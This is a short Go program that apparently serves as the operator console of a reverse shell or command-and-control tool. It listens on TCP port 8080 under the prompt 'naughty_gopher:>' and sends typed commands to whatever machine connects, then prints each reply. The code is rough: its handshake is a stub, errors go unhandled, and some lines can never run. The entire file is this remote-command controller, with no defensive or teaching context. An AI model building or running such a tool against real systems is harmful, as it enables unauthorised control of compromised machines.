package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

/*
add menu for commands
add clear function
 */
func commandLoop(conn net.Conn){
	reader := bufio.NewReader(os.Stdin)
	counter := 0
	for counter < 100 {
		counter += 1
		fmt.Print("naughty_gopher:> ")
		commandString, _ := reader.ReadString('\n')
		sendCommand(conn, commandString)
	}
}

func handshake(conn net.Conn) bool {
	return true
}

func connHandler(conn net.Conn) bool {
	if !handshake(conn){
		return false
	}
	commandLoop(conn)
	return true
}

func sendCommand(conn net.Conn, commandString string) {
	//defer conn.Close()

	var (
		buf = make([]byte, 50000)
		reader   = bufio.NewReader(conn)
		writer   = bufio.NewWriter(conn)
	)

	writer.Write([]byte(commandString))
	writer.Flush()
	//log.Printf("[+] sent: %s", commandString)

ILOOP:
	for {
		n, err := reader.Read(buf)
		data := string(buf[:n])

		switch err {
		case io.EOF:
			break ILOOP
		case nil:
			//log.Println("[+] received response:")
			fmt.Println(data)
			break ILOOP
			if isTransportOver(data) {
				break ILOOP
			}

		default:
			log.Fatalf("[-] receive data failed:%s", err)
			return
		}
	}
}

func isTransportOver(data string) (over bool) {
	over = strings.HasSuffix(data, "\r\n\r\n")
	return
}

func main() {
	fmt.Println("[+] starting server...")
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		// handle error
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			// handle error
		}
		connHandler(conn)
	}
}
